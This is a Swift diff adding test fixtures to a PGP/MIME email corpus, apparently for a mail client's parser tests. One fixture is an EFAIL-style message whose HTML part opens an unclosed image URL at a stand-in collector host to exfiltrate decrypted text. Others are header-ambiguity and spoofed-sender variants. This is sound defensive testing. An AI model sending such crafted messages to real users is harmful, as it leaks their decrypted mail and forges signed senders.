@@ -203,6 +203,79 @@ enum PGPCorpus {
         --enc-boundary--
         """
 
+    /// A mailing list wrapped an encrypted message with its own text: the
+    /// EFAIL "direct exfiltration" shape. Not decrypted automatically.
+    static let partlyEncrypted = """
+        From: Alice Example <alice@example.org>
+        Subject: [list] Encrypted post
+        MIME-Version: 1.0
+        Content-Type: multipart/mixed; boundary="wrap"
+
+        --wrap
+        Content-Type: text/html
+
+        <img src="https://collector.example.net/?q=
+        --wrap
+        Content-Type: multipart/encrypted; protocol="application/pgp-encrypted"; boundary="enc"
+
+        --enc
+        Content-Type: application/pgp-encrypted
+
+        Version: 1
+        --enc
+        Content-Type: application/octet-stream
+
+        \(fakeMessage)
+        --enc--
+        --wrap--
+        """
+
+    // MARK: - Ambiguous structures
+
+    /// `signedSimple` with one header line replaced or added. Each variant is
+    /// read differently by different MIME parsers.
+    static func signedAmbiguous(_ variant: String) -> String {
+        let base = signedSimple()
+        switch variant {
+        case "two-content-types":
+            return base.replacingOccurrences(
+                of: "\n\nThis is an OpenPGP/MIME",
+                with: "\nContent-Type: multipart/mixed; boundary=\"sig-boundary\"\n\nThis is an OpenPGP/MIME")
+        case "two-boundaries":
+            return base.replacingOccurrences(of: " boundary=\"sig-boundary\"",
+                                             with: " boundary=\"sig-boundary\"; boundary=\"other\"")
+        case "rfc2231-boundary":
+            return base.replacingOccurrences(of: " boundary=\"sig-boundary\"",
+                                             with: " boundary=\"sig-boundary\"; boundary*0=\"other\"")
+        case "two-froms":
+            return base.replacingOccurrences(of: "To: Bob Example",
+                                             with: "From: Mallory <mallory@example.net>\nTo: Bob Example")
+        default:
+            preconditionFailure(variant)
+        }
+    }
+
+    /// A signed message whose signed part nests deeper than the parser reads.
+    static func signedTooDeep(depth: Int) -> String {
+        var inner = "Content-Type: text/plain\n\nleaf"
+        for level in 0..<depth {
+            inner = "Content-Type: multipart/mixed; boundary=n\(level)\n\n--n\(level)\n\(inner)\n--n\(level)--"
+        }
+        return """
+            From: Alice Example <alice@example.org>
+            MIME-Version: 1.0
+            Content-Type: multipart/signed; protocol="application/pgp-signature"; boundary=deep
+
+            --deep
+            \(inner)
+            --deep
+            Content-Type: application/pgp-signature
+
+            \(fakeSignature)
+            --deep--
+            """
+    }
+
     // MARK: - Malformed and look-alikes
 
     /// Names the OpenPGP protocol, but the second part is not a signature.
@@ -287,6 +360,15 @@ enum PGPCorpus {
         \(fakePayload.replacingOccurrences(of: "=", with: "=3D"))
         =3DTEST
         -----END PGP MESSAGE-----
+        """
+
+    /// Two armored blocks in one part: neither covers the whole message.
+    static let twoInlineBlocks = """
+        From: Alice Example <alice@example.org>
+        Content-Type: text/plain
+
+        \(fakeMessage)
+        \(fakeMessage)
         """
 
     /// A reply quoting someone's armored block: not this message's own.
